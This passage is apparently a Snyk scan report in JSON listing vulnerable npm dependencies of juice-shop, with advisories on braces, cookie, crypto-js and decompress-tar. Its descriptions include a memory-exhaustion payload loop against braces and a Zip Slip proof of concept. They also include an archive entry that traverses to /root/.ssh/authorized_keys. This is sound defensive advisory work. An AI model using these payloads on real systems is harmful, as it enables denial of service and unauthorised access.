[
  {
    "vulnerabilities": [
      {
        "id": "SNYK-JS-BRACES-6838727",
        "title": "Excessive Platform Resource Consumption within a Loop",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "Mário Teixeira"
        ],
        "semver": {
          "vulnerable": [
            "<3.0.3"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "3.0.3"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "high",
        "cvssScore": 7.5,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "braces",
        "references": [
          {
            "url": "https://github.com/micromatch/braces/commit/a5851e57f45c3431a94d83fc565754bc10f5bbc3",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/micromatch/braces/issues/35",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/micromatch/braces/pull/37",
            "title": "GitHub PR"
          },
          {
            "url": "https://github.com/micromatch/braces/blob/98414f9f1fabe021736e26836d8306d5de747e0d/lib/parse.js%23L308",
            "title": "Vulnerable Code"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cvssV3BaseScore": 7.5,
            "modificationTime": "2024-05-15T13:35:48.924600Z"
          },
          {
            "assigner": "SUSE",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cvssV3BaseScore": 7.5,
            "modificationTime": "2024-10-30T11:04:23.675370Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2025-02-18T11:30:43.161093Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "assigner": "Red Hat",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-05-15T13:35:48.924600Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "assigner": "SUSE",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:23.675370Z"
          }
        ],
        "description": "## Overview\n[braces](https://www.npmjs.com/package/braces) is a Bash-like brace expansion, implemented in JavaScript.\n\nAffected versions of this package are vulnerable to Excessive Platform Resource Consumption within a Loop due improper limitation of the number of characters it can handle, through the `parse` function. An attacker can cause the application to allocate excessive memory and potentially crash by sending imbalanced braces as input.\n## PoC\n```js\r\nconst { braces } = require('micromatch');\r\n\r\nconsole.log(\"Executing payloads...\");\r\n\r\nconst maxRepeats = 10;\r\n\r\nfor (let repeats = 1; repeats <= maxRepeats; repeats += 1) {\r\n  const payload = '{'.repeat(repeats*90000);\r\n\r\n  console.log(`Testing with ${repeats} repeats...`);\r\n  const startTime = Date.now();\r\n  braces(payload);\r\n  const endTime = Date.now();\r\n  const executionTime = endTime - startTime;\r\n  console.log(`Regex executed in ${executionTime / 1000}s.\\n`);\r\n} \r\n```\n## Remediation\nUpgrade `braces` to version 3.0.3 or higher.\n## References\n- [GitHub Commit](https://github.com/micromatch/braces/commit/a5851e57f45c3431a94d83fc565754bc10f5bbc3)\n- [GitHub Issue](https://github.com/micromatch/braces/issues/35)\n- [GitHub PR](https://github.com/micromatch/braces/pull/37)\n- [Vulnerable Code](https://github.com/micromatch/braces/blob/98414f9f1fabe021736e26836d8306d5de747e0d/lib/parse.js#L308)\n",
        "epssDetails": {
          "percentile": "0.37541",
          "probability": "0.00159",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-4068"
          ],
          "CWE": [
            "CWE-1050"
          ]
        },
        "packageName": "braces",
        "proprietary": false,
        "creationTime": "2024-05-13T14:36:53.707650Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-05-13T10:40:14Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-05-13T14:36:53.942014Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-02-18T11:30:43.161093Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "juice-shop@19.0.0",
          "check-dependencies@1.1.1",
          "findup-sync@2.0.0",
          "micromatch@3.1.10",
          "braces@2.3.2"
        ],
        "upgradePath": [
          false,
          "check-dependencies@2.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "braces",
        "version": "2.3.2"
      },
      {
        "id": "SNYK-JS-COOKIE-8163060",
        "title": "Cross-site Scripting (XSS)",
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N",
        "credit": [
          "Unknown"
        ],
        "semver": {
          "vulnerable": [
            "<0.7.0"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [
          "0.7.0"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "cookie",
        "references": [
          {
            "url": "https://github.com/jshttp/cookie/commit/e10042845354fea83bd8f34af72475eed1dadf5c",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/jshttp/cookie/pull/167",
            "title": "GitHub PR"
          },
          {
            "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2316549",
            "title": "Red Hat Bugzilla Bug"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2025-04-29T08:08:05.922006Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-03-10T06:41:09.255374Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N",
            "assigner": "Snyk",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2025-03-10T06:41:09.255374Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2025-04-29T08:08:05.922006Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via the cookie `name`, `path`, or `domain`, which can be used to set unexpected values to other cookie fields.\r\n\r\n## Workaround\r\nUsers who are not able to upgrade to the fixed version should avoid passing untrusted or arbitrary values for the cookie fields and ensure they are set by the application instead of user input.\n## Details\n\nCross-site scripting (or XSS) is a code vulnerability that occurs when an attacker “injects” a malicious script into an otherwise trusted website. The injected script gets downloaded and executed by the end user’s browser when the user interacts with the compromised website.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `cookie` to version 0.7.0 or higher.\n## References\n- [GitHub Commit](https://github.com/jshttp/cookie/commit/e10042845354fea83bd8f34af72475eed1dadf5c)\n- [GitHub PR](https://github.com/jshttp/cookie/pull/167)\n- [Red Hat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id=2316549)\n",
        "epssDetails": {
          "percentile": "0.21720",
          "probability": "0.00069",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-47764"
          ],
          "CWE": [
            "CWE-79"
          ],
          "GHSA": [
            "GHSA-pxg6-pf52-xh8x"
          ]
        },
        "packageName": "cookie",
        "proprietary": false,
        "creationTime": "2024-10-06T09:52:27.790081Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-04T20:31:00Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-06T09:52:28.084562Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-04-29T08:08:05.922006Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "juice-shop@19.0.0",
          "socket.io@3.1.2",
          "engine.io@4.1.2",
          "cookie@0.4.2"
        ],
        "upgradePath": [
          false,
          "socket.io@4.8.0",
          "engine.io@6.6.4",
          "cookie@0.7.2"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "cookie",
        "version": "0.4.2"
      },
      {
        "id": "SNYK-JS-CRYPTOJS-6028119",
        "title": "Use of Weak Hash",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N",
        "credit": [
          "Thomas Shadwell"
        ],
        "semver": {
          "vulnerable": [
            "<4.2.0"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [
          "4.2.0"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "high",
        "cvssScore": 7.2,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "crypto-js",
        "references": [
          {
            "url": "https://github.com/brix/crypto-js/blob/1da3dabf93f0a0435c47627d6f171ad25f452012/src/pbkdf2.js%23L24",
            "title": "CryptoJS Vulnerable Code"
          },
          {
            "url": "https://github.com/brix/crypto-js/security/advisories/GHSA-xwcq-pm8m-c4vf",
            "title": "GitHub Advisory"
          },
          {
            "url": "https://github.com/brix/crypto-js/issues/466",
            "title": "GitHub Issue"
          },
          {
            "url": "https://snyk.io/blog/weak-hash-vulnerability-crypto-js-crypto-es/",
            "title": "Snyk Blog Post"
          },
          {
            "url": "https://twitter.com/zemnmez/status/1714797427604201921",
            "title": "X Thread"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "critical",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
            "cvssV3BaseScore": 9.1,
            "modificationTime": "2024-03-11T09:53:46.036575Z"
          },
          {
            "assigner": "Red Hat",
            "severity": "critical",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
            "cvssV3BaseScore": 9.1,
            "modificationTime": "2024-03-11T09:54:02.991025Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 7.2,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:09:51.667358Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
            "assigner": "NVD",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:53:46.036575Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
            "assigner": "Red Hat",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:54:02.991025Z"
          }
        ],
        "description": "## Overview\n[crypto-js](https://github.com/brix/crypto-js) is a library of crypto standards.\n\nAffected versions of this package are vulnerable to Use of Weak Hash due to inadequate security settings in the `PBKDF2` configuration, which uses insecure SHA1 and has a low iteration count of 1. These insecure settings allow attackers to perform brute-force attacks when `PBKDF2` is used with the default parameters.\r\n\r\nNo information is directly exposed when a hash is generated, regardless of whether the PBKDF2 function is in the vulnerable configuration or not. However, it may be possible to recover the original data, more or less easily depending on the configured parameters, using a brute force attack. This is a low impact on the confidentiality of the protected data, which are in a different scope than the vulnerable package.\r\n\r\nThe attacker similarly may be able to modify some data which is meant to be protected by the vulnerable package - most commonly when it is used for signature verification. This would require a subsequent exploitation, such as forcing a hash collision via length extension attack. The integrity of the data is therefore compromised, but the quantity and targeting of that data is not fully in the attacker's control, yielding a low integrity impact.\r\n\r\n**Notes**\r\n\r\n- This vulnerability is related to https://security.snyk.io/vuln/SNYK-JS-CRYPTOES-6032390 in crypto-es.\r\n\r\n- According to the `crypto-js` maintainer:\r\n\"Active development of CryptoJS has been discontinued. This library is no longer maintained.\"\r\nIt is recommended to use the Node.js native `crypto` module.\r\n\r\n## Workaround\r\n\r\nThis vulnerability can be avoided by setting `PBKDF2` to use SHA-256 instead of SHA-1 and increasing the number of iterations to a sufficiently high value depending on the intended use.\r\nSee, for example, the [OWASP PBKDF2 Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html#pbkdf2) for recommendations.\r\n\r\n**Changelog:**\r\n\r\n2023-10-24 - Initial publication\r\n\r\n2023-10-25 - Added fixed version, updated references, separated crypto-es, description changes, updated CVSS, added CVE ID\r\n\r\n2023-11-07 - Re-assessed CVSS following a CVSS publication on NVD. No changes made to CVSS.\r\n\r\n2024-01-11 - Revised CVSS and description after additional deeper investigation, to reflect the details of the severity assessment\n## Remediation\nUpgrade `crypto-js` to version 4.2.0 or higher.\n## References\n- [CryptoJS Vulnerable Code](https://github.com/brix/crypto-js/blob/1da3dabf93f0a0435c47627d6f171ad25f452012/src/pbkdf2.js#L24)\n- [GitHub Advisory](https://github.com/brix/crypto-js/security/advisories/GHSA-xwcq-pm8m-c4vf)\n- [GitHub Issue](https://github.com/brix/crypto-js/issues/466)\n- [Snyk Blog Post](https://snyk.io/blog/weak-hash-vulnerability-crypto-js-crypto-es/)\n- [X Thread](https://twitter.com/zemnmez/status/1714797427604201921)\n",
        "epssDetails": {
          "percentile": "0.75805",
          "probability": "0.00963",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2023-46233"
          ],
          "CWE": [
            "CWE-328"
          ],
          "GHSA": [
            "GHSA-xwcq-pm8m-c4vf"
          ]
        },
        "packageName": "crypto-js",
        "proprietary": false,
        "creationTime": "2023-10-24T09:00:42.841921Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2023-10-24T21:47:27Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2023-10-24T19:39:17.435148Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:54:02.991025Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "juice-shop@19.0.0",
          "pdfkit@0.11.0",
          "crypto-js@3.3.0"
        ],
        "upgradePath": [
          false,
          "pdfkit@0.12.2",
          "crypto-js@4.2.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "crypto-js",
        "version": "3.3.0"
      },
      {
        "id": "SNYK-JS-DECOMPRESSTAR-559095",
        "title": "Arbitrary File Write via Archive Extraction (Zip Slip)",
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N/E:P/RL:U/RC:C",
        "credit": [
          "Oscar Arnflo"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.3,
        "functions": [
          {
            "version": [
              "*"
            ],
            "functionId": {
              "filePath": "index.js",
              "className": null,
              "functionName": "module.exports"
            }
          }
        ],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "decompress-tar",
        "references": [
          {
            "url": "https://github.com/kevva/decompress/pull/73",
            "title": "GitHub Fix PR"
          },
          {
            "url": "https://github.com/kevva/decompress/issues/71",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/kevva/decompress-tar/pull/12",
            "title": "GitHub PR decompress-tar"
          },
          {
            "url": "https://www.npmjs.com/advisories/1217",
            "title": "NPM Advisory"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "critical",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvssV3BaseScore": 9.8,
            "modificationTime": "2024-03-11T09:50:22.598107Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N/E:P/RL:U/RC:C",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.3,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:00:51.927791Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "assigner": "NVD",
            "severity": "critical",
            "baseScore": 9.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:50:22.598107Z"
          }
        ],
        "description": "## Overview\n[decompress-tar](https://github.com/kevva/decompress-tar) is a tar plugin for decompress.\n\nAffected versions of this package are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip). It is possible to bypass the security measures provided by decompress  and conduct ZIP path traversal through symlinks.\r\n\r\n### PoC\r\n\r\n```\r\nconst decompress = require('decompress');\r\n\r\ndecompress('slip.tar.gz', 'dist').then(files => {\r\n\tconsole.log('done!');\r\n});\r\n```\n\n## Details\n\nIt is exploited using a specially crafted zip archive, that holds path traversal filenames. When exploited, a filename in a malicious archive is concatenated to the target extraction directory, which results in the final path ending up outside of the target folder. For instance, a zip may hold a file with a \"../../file.exe\" location and thus break out of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.\n\nThe following is an example of a zip archive with one benign file and one malicious file. Extracting the malicous file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:\n\n```\n\n+2018-04-15 22:04:29 ..... 19 19 good.txt\n\n+2018-04-15 22:04:42 ..... 20 20 ../../../../../../root/.ssh/authorized_keys\n\n```\n\n## Remediation\nThere is no fixed version for `decompress-tar`.\n## References\n- [GitHub Fix PR](https://github.com/kevva/decompress/pull/73)\n- [GitHub Issue](https://github.com/kevva/decompress/issues/71)\n- [GitHub PR decompress-tar](https://github.com/kevva/decompress-tar/pull/12)\n- [NPM Advisory](https://www.npmjs.com/advisories/1217)\n",
        "epssDetails": {
          "percentile": "0.72010",
          "probability": "0.00737",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2020-12265"
          ],
          "CWE": [
            "CWE-29"
          ],
          "NSP": [
            "1217"
          ],
          "GHSA": [
            "GHSA-qgfr-5hqp-vrw9"
          ]
        },
        "packageName": "decompress-tar",
        "proprietary": false,
        "creationTime": "2020-03-02T11:17:35.161853Z",
        "functions_new": [
          {
            "version": [
              "*"
            ],
            "functionId": {
              "filePath": "index.js",
              "functionName": "module.exports"
            }
          }
        ],
        "alternativeIds": [],
        "disclosureTime": "2019-10-15T20:29:24Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2020-02-27T13:28:41Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:50:22.598107Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "juice-shop@19.0.0",
          "download@8.0.0",
          "decompress@4.2.1",
          "decompress-tar@4.1.1"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "name": "decompress-tar",
        "version": "4.1.1"
      },
      {
        "id": "SNYK-JS-DECOMPRESSTAR-559095",
        "title": "Arbitrary File Write via Archive Extraction (Zip Slip)",
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N/E:P/RL:U/RC:C",
        "credit": [
          "Oscar Arnflo"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.3,
        "functions": [
          {
            "version": [
              "*"
            ],
            "functionId": {
              "filePath": "index.js",
              "className": null,
              "functionName": "module.exports"
            }
          }
        ],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "decompress-tar",
        "references": [
          {
            "url": "https://github.com/kevva/decompress/pull/73",
            "title": "GitHub Fix PR"
          },
          {
            "url": "https://github.com/kevva/decompress/issues/71",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/kevva/decompress-tar/pull/12",
            "title": "GitHub PR decompress-tar"
          },
          {
            "url": "https://www.npmjs.com/advisories/1217",
            "title": "NPM Advisory"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "critical",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvssV3BaseScore": 9.8,
            "modificationTime": "2024-03-11T09:50:22.598107Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N/E:P/RL:U/RC:C",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.3,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:00:51.927791Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "assigner": "NVD",
            "severity": "critical",
            "baseScore": 9.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:50:22.598107Z"
          }
        ],
        "description": "## Overview\n[decompress-tar](https://github.com/kevva/decompress-tar) is a tar plugin for decompress.\n\nAffected versions of this package are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip). It is possible to bypass the security measures provided by decompress  and conduct ZIP path traversal through symlinks.\r\n\r\n### PoC\r\n\r\n```\r\nconst decompress = require('decompress');\r\n\r\ndecompress('slip.tar.gz', 'dist').then(files => {\r\n\tconsole.log('done!');\r\n});\r\n```\n\n## Details\n\nIt is exploited using a specially crafted zip archive, that holds path traversal filenames. When exploited, a filename in a malicious archive is concatenated to the target extraction directory, which results in the final path ending up outside of the target folder. For instance, a zip may hold a file with a \"../../file.exe\" location and thus break out of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.\n\nThe following is an example of a zip archive with one benign file and one malicious file. Extracting the malicous file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:\n\n```\n\n+2018-04-15 22:04:29 ..... 19 19 good.txt\n\n+2018-04-15 22:04:42 ..... 20 20 ../../../../../../root/.ssh/authorized_keys\n\n```\n\n## Remediation\nThere is no fixed version for `decompress-tar`.\n## References\n- [GitHub Fix PR](https://github.com/kevva/decompress/pull/73)\n- [GitHub Issue](https://github.com/kevva/decompress/issues/71)\n- [GitHub PR decompress-tar](https://github.com/kevva/decompress-tar/pull/12)\n- [NPM Advisory](https://www.npmjs.com/advisories/1217)\n",
        "epssDetails": {
          "percentile": "0.72010",
          "probability": "0.00737",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2020-12265"
          ],
          "CWE": [
            "CWE-29"
          ],
          "NSP": [
            "1217"
          ],
          "GHSA": [
            "GHSA-qgfr-5hqp-vrw9"
          ]
        },
        "packageName": "decompress-tar",
        "proprietary": false,
        "creationTime": "2020-03-02T11:17:35.161853Z",
        "functions_new": [
          {
            "version": [
              "*"
            ],
            "functionId": {
              "filePath": "index.js",
              "functionName": "module.exports"
            }
          }
        ],
        "alternativeIds": [],
        "disclosureTime": "2019-10-15T20:29:24Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2020-02-27T13:28:41Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:50:22.598107Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "juice-shop@19.0.0",
          "download@8.0.0",
          "decompress@4.2.1",
          "decompress-tarbz2@4.1.1",
          "decompress-tar@4.1.1"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "name": "decompress-tar",
        "version": "4.1.1"
      },
      {
        "id": "SNYK-JS-DECOMPRESSTAR-559095",
        "title": "Arbitrary File Write via Archive Extraction (Zip Slip)",
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N/E:P/RL:U/RC:C",
        "credit": [
          "Oscar Arnflo"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.3,
        "functions": [
          {
            "version": [
              "*"
            ],
            "functionId": {
              "filePath": "index.js",
              "className": null,
              "functionName": "module.exports"
            }
          }
        ],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "decompress-tar",
        "references": [
          {
            "url": "https://github.com/kevva/decompress/pull/73",
            "title": "GitHub Fix PR"
          },
          {
            "url": "https://github.com/kevva/decompress/issues/71",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/kevva/decompress-tar/pull/12",
            "title": "GitHub PR decompress-tar"
          },
          {
            "url": "https://www.npmjs.com/advisories/1217",
            "title": "NPM Advisory"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "critical",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvssV3BaseScore": 9.8,
            "modificationTime": "2024-03-11T09:50:22.598107Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N/E:P/RL:U/RC:C",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.3,
